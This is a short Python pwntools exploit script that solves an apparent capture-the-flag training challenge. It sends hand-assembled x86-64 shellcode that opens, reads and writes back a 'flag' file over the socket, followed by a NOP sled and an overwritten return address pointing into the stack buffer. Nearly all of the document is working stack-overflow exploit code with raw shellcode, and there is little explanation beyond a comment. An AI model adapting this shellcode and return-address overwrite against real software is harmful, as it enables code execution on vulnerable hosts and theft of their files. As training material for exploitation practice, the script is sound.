import socket
from pwn import *

#Since in this challenge I don't have stdin/stdout, I used open/read/write syscalls to open the file with the flag,
#read it and write it to the socket. In the shellcode, I inserted some nops to reach the sEIP and overwrited it with
#the address of the buffer where I put the "name" (-->shellcode).

context.arch = 'amd64'

"""
#For testing purposes
host = '127.0.0.1'
port = 2005

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

client_socket.connect((host, port))"""

p = remote('bin.training.offdef.it', 2005)
shellcode = b'\x48\x89\xFB\x48\xC7\xC2\x00\x00\x00\x00\x48\xC7\xC6\x00\x00\x00\x00\x48\xC7\xC7\x31\x41\x40\x00\x48\xC7\xC0\x02\x00\x00\x00\x0F\x05\x48\x89\xC7\x48\xC7\xC2\x60\x00\x00\x00\x48\xC7\xC6\x40\x41\x40\x00\x48\xC7\xC0\x00\x00\x00\x00\x0F\x05\x48\x89\xC2\x48\x89\xDF\x48\xC7\xC6\x40\x41\x40\x00\x48\xC7\xC0\x01\x00\x00\x00\x0F\x05' #size 81
p.send(shellcode + b'flag\x00' + b'\x90'*930 + b'\xe0\x40\x40\x00\x00\x00\x00\x00')

p.interactive()